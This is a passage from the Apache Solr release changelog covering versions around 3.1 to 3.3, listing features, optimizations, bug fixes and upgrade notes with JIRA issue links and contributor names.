     Karsten Sperling, Michael Gundlach, Oleg Gnatovskiy, Thomas Traeger,
     Harish Agarwal, yonik, Michael McCandless, Bill Bell)
  4. [SOLR-1331](http://issues.apache.org/jira/browse/SOLR-1331) -- Added a srcCore parameter to CoreAdminHandler's mergeindexes action
     to merge one or more cores' indexes to a target core

     (shalin)
  5. [SOLR-2610](http://issues.apache.org/jira/browse/SOLR-2610) -- Add an option to delete index through CoreAdmin UNLOAD action

     (shalin)
  6. [SOLR-2480](http://issues.apache.org/jira/browse/SOLR-2480): Add ignoreTikaException flag to the extraction request handler so
     that users can ignore TikaException but index meta data.

     (Shinichiro Abe, koji)
  7. [SOLR-2582](http://issues.apache.org/jira/browse/SOLR-2582): Use uniqueKey for error log in UIMAUpdateRequestProcessor.

     (Tommaso Teofili via koji)
+ Optimizations   (1)
  1. [SOLR-2567](http://issues.apache.org/jira/browse/SOLR-2567): Solr now defaults to TieredMergePolicy. See <http://s.apache.org/merging>
     for more information.

     (rmuir)
+ Bug Fixes   (5)
  1. [SOLR-2519](http://issues.apache.org/jira/browse/SOLR-2519): Improve text\_\* fieldTypes in example schema.xml: improve
     cross-language defaults for text\_general; break out separate
     English-specific fieldTypes

     (Jan HÃ¸ydahl, hossman, Robert Muir,
     yonik, Mike McCandless)
  2. [SOLR-2462](http://issues.apache.org/jira/browse/SOLR-2462): Fix extremely high memory usage problems with spellcheck.collate.
     Separately, an additional spellcheck.maxCollationEvaluations (default=10000)
     parameter is added to avoid excessive CPU time in extreme cases (e.g. long
     queries with many misspelled words).

     (James Dyer via rmuir)
  3. [SOLR-2579](http://issues.apache.org/jira/browse/SOLR-2579): UIMAUpdateRequestProcessor ignore error fails if text.length() < 100.

     (Elmer Garduno via koji)
  4. [SOLR-2581](http://issues.apache.org/jira/browse/SOLR-2581): UIMAToSolrMapper wrongly instantiates Type with reflection.

     (Tommaso Teofili via koji)
  5. [SOLR-2551](http://issues.apache.org/jira/browse/SOLR-2551): Check dataimport.properties for write access (if delta-import is
     supported in DIH configuration) before starting an import

     (C S, shalin)
+ Other Changes   (5)
  1. [SOLR-2571](http://issues.apache.org/jira/browse/SOLR-2571): Add a commented out example of the spellchecker's thresholdTokenFrequency
     parameter to the example solrconfig.xml, and also add a unit test for this feature.

     (James Dyer via rmuir)
  2. [SOLR-2576](http://issues.apache.org/jira/browse/SOLR-2576): Deprecate SpellingResult.add(Token token, int docFreq), please use
     SpellingResult.addFrequency(Token token, int docFreq) instead.

     (James Dyer via rmuir)
  3. [SOLR-2574](http://issues.apache.org/jira/browse/SOLR-2574): Upgrade slf4j to v1.6.1

     (shalin)
  4. [LUCENE-3204](http://issues.apache.org/jira/browse/LUCENE-3204): The maven-ant-tasks jar is now included in the source tree;
     users of the generate-maven-artifacts target no longer have to manually
     place this jar in the Ant classpath. NOTE: when Ant looks for the
     maven-ant-tasks jar, it looks first in its pre-existing classpath, so
     any copies it finds will be used instead of the copy included in the
     Lucene/Solr source tree. For this reason, it is recommeded to remove
     any copies of the maven-ant-tasks jar in the Ant classpath, e.g. under
     ~/.ant/lib/ or under the Ant installation's lib/ directory.

     (Steve Rowe)
  5. [SOLR-2611](http://issues.apache.org/jira/browse/SOLR-2611): Fix typos in the example configuration

     (Eric Pugh via rmuir)

### Release 3.2.0 [2011-06-03]

+ Versions of Major Components   (3)
  1. Apache Lucene trunk
  2. Apache Tika 0.8
  3. Carrot2 3.4.2
+ Upgrading from Solr 3.1   (2)
  1. The updateRequestProcessorChain for a RequestHandler is now defined
     with update.chain rather than update.processor. The latter still works,
     but has been deprecated.
  2. <uimaConfig/> just beneath <config> ... </config> is no longer supported.
     It should move to UIMAUpdateRequestProcessorFactory setting.
     See contrib/uima/README.txt for more details.

     ([SOLR-2436](http://issues.apache.org/jira/browse/SOLR-2436))
#### Detailed Change List

+ New Features   (6)
  1. [SOLR-2496](http://issues.apache.org/jira/browse/SOLR-2496): Add ability to specify overwrite and commitWithin as request
     parameters (e.g. specified in the URL) when using the JSON update format,
     and added a simplified format for specifying multiple documents.
     Example: [{"id":"doc1"},{"id":"doc2"}]

     (yonik)
  2. [SOLR-2113](http://issues.apache.org/jira/browse/SOLR-2113): Add TermQParserPlugin, registered as "term". This is useful
     when generating filter queries from terms returned from field faceting or
     the terms component. Example: fq={!term f=weight}1.5

     (hossman, yonik)
  3. [SOLR-1915](http://issues.apache.org/jira/browse/SOLR-1915): DebugComponent now supports using a NamedList to model
     Explanation objects in it's responses instead of
     Explanation.toString

     (hossman)
  4. [SOLR-2448](http://issues.apache.org/jira/browse/SOLR-2448): Search results clustering updates: bisecting k-means
     clustering algorithm added, loading of Carrot2 stop words from
     <solr.home>/conf/carrot2 ([SOLR-2449](http://issues.apache.org/jira/browse/SOLR-2449)), using Solr's stopwords.txt
     for clustering ([SOLR-2450](http://issues.apache.org/jira/browse/SOLR-2450)), output of cluster scores ([SOLR-2505](http://issues.apache.org/jira/browse/SOLR-2505))

     (Stanislaw Osinski, Dawid Weiss).
  5. [SOLR-2503](http://issues.apache.org/jira/browse/SOLR-2503): extend UIMAUpdateRequestProcessorFactory mapping function to
     map feature value to dynamicField.

     (koji)
  6. [SOLR-2512](http://issues.apache.org/jira/browse/SOLR-2512): add ignoreErrors flag to UIMAUpdateRequestProcessorFactory so
     that users can ignore exceptions in AE.

     (Tommaso Teofili, koji)
+ Optimizations   (none)
+ Bug Fixes   (17)
  1. [SOLR-2445](http://issues.apache.org/jira/browse/SOLR-2445): Change the default qt to blank in form.jsp, because there is no "standard"
     request handler unless you have it in your solrconfig.xml explicitly.

     (koji)
  2. [SOLR-2455](http://issues.apache.org/jira/browse/SOLR-2455): Prevent double submit of forms in admin interface.

     (Jeffrey Chang via uschindler)
  3. [SOLR-2464](http://issues.apache.org/jira/browse/SOLR-2464): Fix potential slowness in QueryValueSource (the query() function) when
     the query is very sparse and may not match any documents in a segment.

     (yonik)
  4. [SOLR-2469](http://issues.apache.org/jira/browse/SOLR-2469): When using java replication with replicateAfter=startup, the first
     commit point on server startup is never removed.

     (yonik)
  5. [SOLR-2466](http://issues.apache.org/jira/browse/SOLR-2466): SolrJ's CommonsHttpSolrServer would retry requests on failure, regardless
     of the configured maxRetries, due to HttpClient having it's own retry mechanism
     by default. The retryCount of HttpClient is now set to 0, and SolrJ does
     the retry.

     (yonik)
  6. [SOLR-2409](http://issues.apache.org/jira/browse/SOLR-2409): edismax parser - treat the text of a fielded query as a literal if the
     fieldname does not exist. For example Mission: Impossible should not search on
     the "Mission" field unless it's a valid field in the schema.

     (Ryan McKinley, yonik)
  7. [SOLR-2403](http://issues.apache.org/jira/browse/SOLR-2403): facet.sort=index reported incorrect results for distributed search
     in a number of scenarios when facet.mincount>0. This patch also adds some
     performance/algorithmic improvements when (facet.sort=count && facet.mincount=1
     && facet.limit=-1) and when (facet.sort=index && facet.mincount>0)

     (yonik)
  8. [SOLR-2333](http://issues.apache.org/jira/browse/SOLR-2333): The "rename" core admin action does not persist the new name to solr.xml

     (Rasmus Hahn, Paul R. Brown via Mark Miller)
  9. [SOLR-2390](http://issues.apache.org/jira/browse/SOLR-2390): Performance of usePhraseHighlighter is terrible on very large Documents,
     regardless of hl.maxDocCharsToAnalyze.

     (Mark Miller)
  10. [SOLR-2474](http://issues.apache.org/jira/browse/SOLR-2474): The helper TokenStreams in analysis.jsp and AnalysisRequestHandlerBase
      did not clear all attributes so they displayed incorrect attribute values for tokens
      in later filter stages.

      (uschindler, rmuir, yonik)
  11. [SOLR-2467](http://issues.apache.org/jira/browse/SOLR-2467): Fix <analyzer class="..." /> initialization so any errors
      are logged properly.

      (hossman)
  12. [SOLR-2493](http://issues.apache.org/jira/browse/SOLR-2493): SolrQueryParser was fixed to not parse the SolrConfig DOM tree on each
      instantiation which is a huge slowdown.

      (Stephane Bailliez via uschindler)
  13. [SOLR-2495](http://issues.apache.org/jira/browse/SOLR-2495): The JSON parser could hang on corrupted input and could fail
      to detect numbers that were too large to fit in a long.

      (yonik)
  14. [SOLR-2520](http://issues.apache.org/jira/browse/SOLR-2520): Make JSON response format escape \u2029 as well as \u2028
      in strings since those characters are not valid in javascript strings
      (although they are valid in JSON strings).

      (yonik)
  15. [SOLR-2536](http://issues.apache.org/jira/browse/SOLR-2536): Add ReloadCacheRequestHandler to fix ExternalFileField bug (if reopenReaders
      set to true and no index segments have been changed, commit cannot trigger reload
      external file).

      (koji)
  16. [SOLR-2539](http://issues.apache.org/jira/browse/SOLR-2539): VectorValueSource.floatVal incorrectly used byteVal on sub-sources.

      (Tom Liu via yonik)
  17. [SOLR-2554](http://issues.apache.org/jira/browse/SOLR-2554): RandomSortField didn't work when used in a function query.

      (yonik)
+ Other Changes   (7)
  1. [SOLR-2061](http://issues.apache.org/jira/browse/SOLR-2061): Pull base tests out into a new Solr Test Framework module,
     and publish binary, javadoc, and source test-framework jars.

     (Drew Farris, Robert Muir, Steve Rowe)
  2. [SOLR-2105](http://issues.apache.org/jira/browse/SOLR-2105): Rename RequestHandler param 'update.processor' to 'update.chain'.

     (Jan HÃ¸ydahl via Mark Miller)
  3. [SOLR-2485](http://issues.apache.org/jira/browse/SOLR-2485): Deprecate BaseResponseWriter, GenericBinaryResponseWriter, and
     GenericTextResponseWriter. These classes will be removed in 4.0.

     (ryan)
  4. [SOLR-2451](http://issues.apache.org/jira/browse/SOLR-2451): Enhance assertJQ to allow individual tests to specify the
     tolerance delta used in numeric equalities. This allows for slight
     variance in asserting score comparisons in unit tests.

     (David Smiley, Chris Hostetter)
  5. [SOLR-2528](http://issues.apache.org/jira/browse/SOLR-2528): Remove default="true" from HtmlEncoder in example solrconfig.xml,
     because html encoding confuses non-ascii users.

     (koji)
  6. [SOLR-2387](http://issues.apache.org/jira/browse/SOLR-2387): add mock annotators for improved testing in contrib/uima,

     (Tommaso Teofili via rmuir)
  7. [SOLR-2436](http://issues.apache.org/jira/browse/SOLR-2436): move uimaConfig to under the uima's update processor in
     solrconfig.xml.

     (Tommaso Teofili, koji)
+ Build   (1)
  1. [LUCENE-3006](http://issues.apache.org/jira/browse/LUCENE-3006): Building javadocs will fail on warnings by default. Override with -Dfailonjavadocwarning=false

     (sarowe, gsingers)
+ Documentation   (none)

### Release 3.1.0 [2011-03-31]

+ Versions of Major Components   (5)
  1. Apache Lucene 3.1.0
  2. Apache Tika 0.8
  3. Carrot2 3.4.2
  4. Velocity 1.6.1 and Velocity Tools 2.0-beta3
  5. Apache UIMA 2.3.1-SNAPSHOT
+ Upgrading from Solr 1.4   (13)
  1. The Lucene index format has changed and as a result, once you upgrade,
     previous versions of Solr will no longer be able to read your indices.
     In a master/slave configuration, all searchers/slaves should be upgraded
     before the master. If the master were to be updated first, the older
     searchers would not be able to read the new index format.
  2. The Solr JavaBin format has changed as of Solr 3.1. If you are using the
     JavaBin format, you will need to upgrade your SolrJ client.

     ([SOLR-2034](http://issues.apache.org/jira/browse/SOLR-2034))
  3. The experimental ALIAS command has been removed

     ([SOLR-1637](http://issues.apache.org/jira/browse/SOLR-1637))
  4. Using solr.xml is recommended for single cores also

     ([SOLR-1621](http://issues.apache.org/jira/browse/SOLR-1621))
  5. Old syntax of <highlighting> configuration in solrconfig.xml
     is deprecated

     ([SOLR-1696](http://issues.apache.org/jira/browse/SOLR-1696))
  6. The deprecated HTMLStripReader, HTMLStripWhitespaceTokenizerFactory and
     HTMLStripStandardTokenizerFactory were removed. To strip HTML tags,
     HTMLStripCharFilter should be used instead, and it works with any
     Tokenizer of your choice.

     ([SOLR-1657](http://issues.apache.org/jira/browse/SOLR-1657))
  7. Field compression is no longer supported. Fields that were formerly
     compressed will be uncompressed as index segments are merged. For
     shorter fields, this may actually be an improvement, as the compression
     used was not very good for short text. Some indexes may get larger though.
  8. [SOLR-1845](http://issues.apache.org/jira/browse/SOLR-1845): The TermsComponent response format was changed so that the
     "terms" container is a map instead of a named list. This affects
     response formats like JSON, but not XML.

     (yonik)
  9. [SOLR-1876](http://issues.apache.org/jira/browse/SOLR-1876): All Analyzers and TokenStreams are now final to enforce
     the decorator pattern.

     (rmuir, uschindler)
  10. [LUCENE-2608](http://issues.apache.org/jira/browse/LUCENE-2608): Added the ability to specify the accuracy on a per request basis.
      It is recommended that implementations of SolrSpellChecker should change over to the new SolrSpellChecker
      methods using the new SpellingOptions class, but are not required to. While this change is
      backward compatible, the trunk version of Solr has already dropped support for all but the SpellingOptions method.

      (gsingers)
  11. readercycle script was removed.

      ([SOLR-2046](http://issues.apache.org/jira/browse/SOLR-2046))
  12. In previous releases, sorting or evaluating function queries on
      fields that were "multiValued" (either by explicit declaration in
      schema.xml or by implict behavior because the "version" attribute on
      the schema was less then 1.2) did not generally work, but it would
      sometimes silently act as if it succeeded and order the docs
      arbitrarily. Solr will now fail on any attempt to sort, or apply a
      function to, multi-valued fields
  13. The DataImportHandler jars are no longer included in the solr
      WAR and should be added in Solr's lib directory, or referenced
      via the <lib> directive in solrconfig.xml.
#### Detailed Change List

+ New Features   (71)
  1. [SOLR-1302](http://issues.apache.org/jira/browse/SOLR-1302): Added several new distance based functions, including
     Great Circle (haversine), Manhattan, Euclidean and String (using the
     StringDistance methods in the Lucene spellchecker).
     Also added geohash(), deg() and rad() convenience functions.
     See <http://wiki.apache.org/solr/FunctionQuery.>

     (gsingers)
  2. [SOLR-1553](http://issues.apache.org/jira/browse/SOLR-1553): New dismax parser implementation (accessible as "edismax")
     that supports full lucene syntax, improved reserved char escaping,
     fielded queries, improved proximity boosting, and improved stopword
     handling. Note: status is experimental for now.

     (yonik)
  3. [SOLR-1574](http://issues.apache.org/jira/browse/SOLR-1574): Add many new functions from java Math (e.g. sin, cos)

     (yonik)
  4. [SOLR-1569](http://issues.apache.org/jira/browse/SOLR-1569): Allow functions to take in literal strings by modifying the
     FunctionQParser and adding LiteralValueSource

     (gsingers)
  5. [SOLR-1571](http://issues.apache.org/jira/browse/SOLR-1571): Added unicode collation support though Lucene's CollationKeyFilter

     (Robert Muir via shalin)
  6. [SOLR-785](http://issues.apache.org/jira/browse/SOLR-785): Distributed Search support for SpellCheckComponent

     (Matthew Woytowitz, shalin)
  7. [SOLR-1625](http://issues.apache.org/jira/browse/SOLR-1625): Add regexp support for TermsComponent

     (Uri Boness via noble)
  8. [SOLR-1297](http://issues.apache.org/jira/browse/SOLR-1297): Add sort by Function capability

     (gsingers, yonik)
  9. [SOLR-1139](http://issues.apache.org/jira/browse/SOLR-1139): Add TermsComponent Query and Response Support in SolrJ

     (Matt Weber via shalin)
  10. [SOLR-1177](http://issues.apache.org/jira/browse/SOLR-1177): Distributed Search support for TermsComponent

      (Matt Weber via shalin)
  11. [SOLR-1621](http://issues.apache.org/jira/browse/SOLR-1621), [SOLR-1722](http://issues.apache.org/jira/browse/SOLR-1722): Allow current single core deployments to be specified by solr.xml

      (Mark Miller , noble)
  12. [SOLR-1532](http://issues.apache.org/jira/browse/SOLR-1532): Allow StreamingUpdateSolrServer to use a provided HttpClient

      (Gabriele Renzi via shalin)
  13. [SOLR-1653](http://issues.apache.org/jira/browse/SOLR-1653): Add PatternReplaceCharFilter

      (koji)
  14. [SOLR-1131](http://issues.apache.org/jira/browse/SOLR-1131): FieldTypes can now output multiple Fields per Type and still be searched. This can be handy for hiding the details of a particular
      implementation such as in the spatial case.

      (Chris Mattmann, shalin, noble, gsingers, yonik)
  15. [SOLR-1586](http://issues.apache.org/jira/browse/SOLR-1586): Add support for Geohash and Spatial Tile FieldType

      (Chris Mattmann, gsingers)
  16. [SOLR-1697](http://issues.apache.org/jira/browse/SOLR-1697): PluginInfo should load plugins w/o class attribute also

      (noble)
  17. [SOLR-1268](http://issues.apache.org/jira/browse/SOLR-1268): Incorporate FastVectorHighlighter

      (koji)
  18. [SOLR-1750](http://issues.apache.org/jira/browse/SOLR-1750): SolrInfoMBeanHandler added for simpler programmatic access
      to info currently available from registry.jsp and stats.jsp

      (ehatcher, hossman)
  19. [SOLR-1815](http://issues.apache.org/jira/browse/SOLR-1815): SolrJ now preserves the order of facet queries.

      (yonik)
  20. [SOLR-1677](http://issues.apache.org/jira/browse/SOLR-1677): Add support for choosing the Lucene Version for Lucene components within
      Solr.

      (Uwe Schindler, Mark Miller)
  21. [SOLR-1379](http://issues.apache.org/jira/browse/SOLR-1379): Add RAMDirectoryFactory for non-persistent in memory index storage.

      (Alex Baranov via yonik)
  22. [SOLR-1857](http://issues.apache.org/jira/browse/SOLR-1857): Synced Solr analysis with Lucene 3.1. Added KeywordMarkerFilterFactory
      and StemmerOverrideFilterFactory, which can be used to tune stemming algorithms.
      Added factories for Bulgarian, Czech, Hindi, Turkish, and Wikipedia analysis. Improved the
      performance of SnowballPorterFilterFactory.

      (rmuir)
  23. [SOLR-1657](http://issues.apache.org/jira/browse/SOLR-1657): Converted remaining TokenStreams to the Attributes-based API. All Solr
      TokenFilters now support custom Attributes, and some have improved performance:
      especially WordDelimiterFilter and CommonGramsFilter.

      (rmuir, cmale, uschindler)
  24. [SOLR-1740](http://issues.apache.org/jira/browse/SOLR-1740): ShingleFilterFactory supports the "minShingleSize" and "tokenSeparator"
      parameters for controlling the minimum shingle size produced by the filter, and
      the separator string that it uses, respectively.

      (Steven Rowe via rmuir)
  25. [SOLR-744](http://issues.apache.org/jira/browse/SOLR-744): ShingleFilterFactory supports the "outputUnigramsIfNoShingles"
      parameter, to output unigrams if the number of input tokens is fewer than
      minShingleSize, and no shingles can be generated.

      (Chris Harris via Steven Rowe)
  26. [SOLR-1923](http://issues.apache.org/jira/browse/SOLR-1923): PhoneticFilterFactory now has support for the
      Caverphone algorithm.

      (rmuir)
  27. [SOLR-1957](http://issues.apache.org/jira/browse/SOLR-1957): The VelocityResponseWriter contrib moved to core.
      Example search UI now available at <http://localhost:8983/solr/browse>

      (ehatcher)
  28. [SOLR-1974](http://issues.apache.org/jira/browse/SOLR-1974): Add LimitTokenCountFilterFactory.

      (koji)
  29. [SOLR-1966](http://issues.apache.org/jira/browse/SOLR-1966): QueryElevationComponent can now return just the included results in the elevation file

      (gsingers, yonik)
  30. [SOLR-1556](http://issues.apache.org/jira/browse/SOLR-1556): TermVectorComponent now supports per field overrides. Also, it now throws an error
      if passed in fields do not exist and warnings
      if fields that do not have term vector options (termVectors, offsets, positions)
      that align with the schema declaration. It also
      will now return warnings about

      (gsingers)
  31. [SOLR-1985](http://issues.apache.org/jira/browse/SOLR-1985): FastVectorHighlighter: add wrapper class for Lucene's SingleFragListBuilder

      (koji)
  32. [SOLR-1984](http://issues.apache.org/jira/browse/SOLR-1984): Add HyphenationCompoundWordTokenFilterFactory.

      (PB via rmuir)
  33. [SOLR-397](http://issues.apache.org/jira/browse/SOLR-397): Date Faceting now supports a "facet.date.include" param
      for specifying when the upper & lower end points of computed date
      ranges should be included in the range. Legal values are: "all",
      "lower", "upper", "edge", and "outer". For backwards compatibility
      the default value is the set: [lower,upper,edge], so that all ranges
      between start and end are inclusive of their endpoints, but the
      "before" and "after" ranges are not.
  34. [SOLR-945](http://issues.apache.org/jira/browse/SOLR-945): JSON update handler that accepts add, delete, commit
      commands in JSON format.

      (Ryan McKinley, yonik)
  35. [SOLR-2015](http://issues.apache.org/jira/browse/SOLR-2015): Add a boolean attribute autoGeneratePhraseQueries to TextField.
      autoGeneratePhraseQueries="true" (the default) causes the query parser to
      generate phrase queries if multiple tokens are generated from a single
      non-quoted analysis string. For example WordDelimiterFilter splitting text:pdp-11
      will cause the parser to generate text:"pdp 11" rather than (text:PDP OR text:11).
      Note that autoGeneratePhraseQueries="true" tends to not work well for non whitespace
      delimited languages.

      (yonik)
  36. [SOLR-1925](http://issues.apache.org/jira/browse/SOLR-1925): Add CSVResponseWriter (use wt=csv) that returns the list of documents
      in CSV format.

      (Chris Mattmann, yonik)
  37. [SOLR-1240](http://issues.apache.org/jira/browse/SOLR-1240): "Range Faceting" has been added. This is a generalization
      of the existing "Date Faceting" logic so that it now supports any
      all stock numeric field types that support range queries in addition
      to dates. facet.date is now deprecated in favor of this generalized mechanism.

      (Gijs Kunze, hossman)
  38. [SOLR-2021](http://issues.apache.org/jira/browse/SOLR-2021): Add SolrEncoder plugin to Highlighter.

      (koji)
  39. [SOLR-2030](http://issues.apache.org/jira/browse/SOLR-2030): Make FastVectorHighlighter use of SolrEncoder.

      (koji)
  40. [SOLR-2053](http://issues.apache.org/jira/browse/SOLR-2053): Add support for custom comparators in Solr spellchecker, per [LUCENE-2479](http://issues.apache.org/jira/browse/LUCENE-2479)

      (gsingers)
  41. [SOLR-2049](http://issues.apache.org/jira/browse/SOLR-2049): Add hl.multiValuedSeparatorChar for FastVectorHighlighter, per [LUCENE-2603](http://issues.apache.org/jira/browse/LUCENE-2603).

      (koji)
  42. [SOLR-2059](http://issues.apache.org/jira/browse/SOLR-2059): Add "types" attribute to WordDelimiterFilterFactory, which
      allows you to customize how WordDelimiterFilter tokenizes text with
      a configuration file.

      (Peter Karich, rmuir)
  43. [SOLR-2099](http://issues.apache.org/jira/browse/SOLR-2099): Add ability to throttle rsync based replication using rsync option --bwlimit.

      (Brandon Evans via koji)
  44. [SOLR-1316](http://issues.apache.org/jira/browse/SOLR-1316): Create autosuggest component.

      (Ankul Garg, Jason Rutherglen, Shalin Shekhar Mangar, Grant Ingersoll, Robert Muir, ab)
  45. [SOLR-1568](http://issues.apache.org/jira/browse/SOLR-1568): Added "native" filtering support for PointType, GeohashField. Added LatLonType with filtering support too. See
      <http://wiki.apache.org/solr/SpatialSearch> and the example. Refactored some items in Lucene spatial.
      Removed SpatialTileField as the underlying CartesianTier is broken beyond repair and is going to be moved.

      (gsingers)
  46. [SOLR-2128](http://issues.apache.org/jira/browse/SOLR-2128): Full parameter substitution for function queries.
      Example: q=add($v1,$v2)&v1=mul(popularity,5)&v2=20.0

      (yonik)
  47. [SOLR-2133](http://issues.apache.org/jira/browse/SOLR-2133): Function query parser can now parse multiple comma separated
      value sources. It also now fails if there is extra unexpected text
      after parsing the functions, instead of silently ignoring it.
      This allows expressions like q=dist(2,vector(1,2),$pt)&pt=3,4

      (yonik)
  48. [SOLR-2157](http://issues.apache.org/jira/browse/SOLR-2157): Suggester should return alpha-sorted results when onlyMorePopular=false

      (ab)
  49. [SOLR-2010](http://issues.apache.org/jira/browse/SOLR-2010): Added ability to verify that spell checking collations have
      actual results in the index.

      (James Dyer via gsingers)
  50. [SOLR-2188](http://issues.apache.org/jira/browse/SOLR-2188): Added "maxTokenLength" argument to the factories for ClassicTokenizer,
      StandardTokenizer, and UAX29URLEmailTokenizer.

      (Steven Rowe)
  51. [SOLR-2129](http://issues.apache.org/jira/browse/SOLR-2129): Added a Solr module for dynamic metadata extraction/indexing with Apache UIMA.
      See contrib/uima/README.txt for more information.

      (Tommaso Teofili via rmuir)
  52. [SOLR-2325](http://issues.apache.org/jira/browse/SOLR-2325): Allow tagging and exclusion of main query for faceting.

      (yonik)
  53. [SOLR-2263](http://issues.apache.org/jira/browse/SOLR-2263): Add ability for RawResponseWriter to stream binary files as well as
      text files.

      (Eric Pugh via yonik)
  54. [SOLR-860](http://issues.apache.org/jira/browse/SOLR-860): Add debug output for MoreLikeThis.

      (koji)
  55. [SOLR-1057](http://issues.apache.org/jira/browse/SOLR-1057): Add PathHierarchyTokenizerFactory.

      (ryan, koji)
  56. [SOLR-1804](http://issues.apache.org/jira/browse/SOLR-1804): Re-enabled clustering component on trunk, updated to latest
      version of Carrot2. No more LGPL run-time dependencies. This release of
      C2 also does not have a specific Lucene dependency.

      (Stanislaw Osinski, gsingers)
  57. [SOLR-2282](http://issues.apache.org/jira/browse/SOLR-2282): Add distributed search support for search result clustering.

      (Brad Giaccio, Dawid Weiss, Stanislaw Osinski, rmuir, koji)
  58. [SOLR-2210](http://issues.apache.org/jira/browse/SOLR-2210): Add icu-based tokenizer and filters to contrib/analysis-extras

      (rmuir)
  59. [SOLR-1336](http://issues.apache.org/jira/browse/SOLR-1336): Add SmartChinese (word segmentation for Simplified Chinese)
      tokenizer and filters to contrib/analysis-extras

      (rmuir)
  60. [SOLR-2211](http://issues.apache.org/jira/browse/SOLR-2211),[LUCENE-2763](http://issues.apache.org/jira/browse/LUCENE-2763): Added UAX29URLEmailTokenizerFactory, which implements
      UAX#29, a unicode algorithm with good results for most languages, as well as
      URL and E-mail tokenization according to the relevant RFCs.

      (Tom Burton-West via rmuir)
  61. [SOLR-2237](http://issues.apache.org/jira/browse/SOLR-2237): Added StempelPolishStemFilterFactory to contrib/analysis-extras

      (rmuir)
  62. [SOLR-1525](http://issues.apache.org/jira/browse/SOLR-1525): allow DIH to refer to core properties

      (noble)
  63. [SOLR-1547](http://issues.apache.org/jira/browse/SOLR-1547): DIH TemplateTransformer copy objects more intelligently when the
      template is a single variable

      (noble)
  64. [SOLR-1627](http://issues.apache.org/jira/browse/SOLR-1627): DIH VariableResolver should be fetched just in time

      (noble)
  65. [SOLR-1583](http://issues.apache.org/jira/browse/SOLR-1583): DIH Create DataSources that return InputStream

      (noble)
  66. [SOLR-1358](http://issues.apache.org/jira/browse/SOLR-1358): Integration of Tika and DataImportHandler

      (Akshay Ukey, noble)
  67. [SOLR-1654](http://issues.apache.org/jira/browse/SOLR-1654): TikaEntityProcessor example added DIHExample

      (Akshay Ukey via noble)
  68. [SOLR-1678](http://issues.apache.org/jira/browse/SOLR-1678): Move onError handling to DIH framework

      (noble)
  69. [SOLR-1352](http://issues.apache.org/jira/browse/SOLR-1352): Multi-threaded implementation of DIH

      (noble)
  70. [SOLR-1721](http://issues.apache.org/jira/browse/SOLR-1721): Add explicit option to run DataImportHandler in synchronous mode

      (Alexey Serba via noble)
  71. [SOLR-1737](http://issues.apache.org/jira/browse/SOLR-1737): Added FieldStreamDataSource

      (noble)
+ Optimizations   (7)
  1. [SOLR-1679](http://issues.apache.org/jira/browse/SOLR-1679): Don't build up string messages in SolrCore.execute unless they
     are necessary for the current log level.

     (Fuad Efendi and hossman)
  2. [SOLR-1874](http://issues.apache.org/jira/browse/SOLR-1874): Optimize PatternReplaceFilter for better performance.

     (rmuir, uschindler)
  3. [SOLR-1968](http://issues.apache.org/jira/browse/SOLR-1968): speed up initial filter cache population for facet.method=enum and
     also big terms for multi-valued facet.method=fc. The resulting speedup
     for the first facet request is anywhere from 30% to 32x, depending on how many
     terms are in the field and how many documents match per term.

     (yonik)
  4. [SOLR-2089](http://issues.apache.org/jira/browse/SOLR-2089): Speed up UnInvertedField faceting (facet.method=fc for
     multi-valued fields) when facet.limit is both high, and a high enough
     percentage of the number of unique terms in the field. Extreme cases
     yield speedups over 3x.

     (yonik)
  5. [SOLR-2046](http://issues.apache.org/jira/browse/SOLR-2046): add common functions to scripts-util.

     (koji)
  6. [SOLR-1684](http://issues.apache.org/jira/browse/SOLR-1684): Switch clustering component to use the
     SolrIndexSearcher.doc(int, Set<String>) method b/c it can use the document
     cache

     (gsingers)
  7. [SOLR-2200](http://issues.apache.org/jira/browse/SOLR-2200): Improve the performance of DataImportHandler for large
     delta-import updates.

     (Mark Waddle via rmuir)
+ Bug Fixes   (93)
  1. [SOLR-1769](http://issues.apache.org/jira/browse/SOLR-1769): Solr 1.4 Replication - Repeater throwing NullPointerException

     (JÃ¶rgen Rydenius via noble)
  2. [SOLR-1432](http://issues.apache.org/jira/browse/SOLR-1432): Make the new ValueSource.getValues(context,reader) delegate
     to the original ValueSource.getValues(reader) so custom sources
     will work.

     (yonik)
  3. [SOLR-1572](http://issues.apache.org/jira/browse/SOLR-1572): FastLRUCache correctly implemented the LRU policy only
     for the first 2B accesses.

     (yonik)
  4. [SOLR-1582](http://issues.apache.org/jira/browse/SOLR-1582): copyField was ignored for BinaryField types

     (gsingers)
  5. [SOLR-1563](http://issues.apache.org/jira/browse/SOLR-1563): Binary fields, including trie-based numeric fields, caused null
     pointer exceptions in the luke request handler.

     (yonik)
  6. [SOLR-1577](http://issues.apache.org/jira/browse/SOLR-1577): The example solrconfig.xml defaulted to a solr data dir
     relative to the current working directory, even if a different solr home
     was being used. The new behavior changes the default to a zero length
     string, which is treated the same as if no dataDir had been specified,
     hence the "data" directory under the solr home will be used.

     (yonik)
  7. [SOLR-1584](http://issues.apache.org/jira/browse/SOLR-1584): SolrJ - SolrQuery.setIncludeScore() incorrectly added
     fl=score to the parameter list instead of appending score to the
     existing field list.

     (yonik)
  8. [SOLR-1580](http://issues.apache.org/jira/browse/SOLR-1580): Solr Configuration ignores 'mergeFactor' parameter, always
     uses Lucene default.

     (Lance Norskog via Mark Miller)
  9. [SOLR-1593](http://issues.apache.org/jira/browse/SOLR-1593): ReverseWildcardFilter didn't work for surrogate pairs
     (i.e. code points outside of the BMP), resulting in incorrect
     matching. This change requires reindexing for any content with
     such characters.

     (Robert Muir, yonik)
  10. [SOLR-1596](http://issues.apache.org/jira/browse/SOLR-1596): A rollback operation followed by the shutdown of Solr
      or the close of a core resulted in a warning:
      "SEVERE: SolrIndexWriter was not closed prior to finalize()" although
      there were no other consequences.

      (yonik)
  11. [SOLR-1595](http://issues.apache.org/jira/browse/SOLR-1595): StreamingUpdateSolrServer used the platform default character
      set when streaming updates, rather than using UTF-8 as the HTTP headers
      indicated, leading to an encoding mismatch.

      (hossman, yonik)
  12. [SOLR-1587](http://issues.apache.org/jira/browse/SOLR-1587): A distributed search request with fl=score, didn't match
      the behavior of a non-distributed request since it only returned
      the id,score fields instead of all fields in addition to score.

      (yonik)
  13. [SOLR-1601](http://issues.apache.org/jira/browse/SOLR-1601): Schema browser does not indicate presence of charFilter.

      (koji)
  14. [SOLR-1615](http://issues.apache.org/jira/browse/SOLR-1615): Backslash escaping did not work in quoted strings
      for local param arguments.

      (Wojtek Piaseczny, yonik)
  15. [SOLR-1628](http://issues.apache.org/jira/browse/SOLR-1628): log contains incorrect number of adds and deletes.

      (Thijs Vonk via yonik)
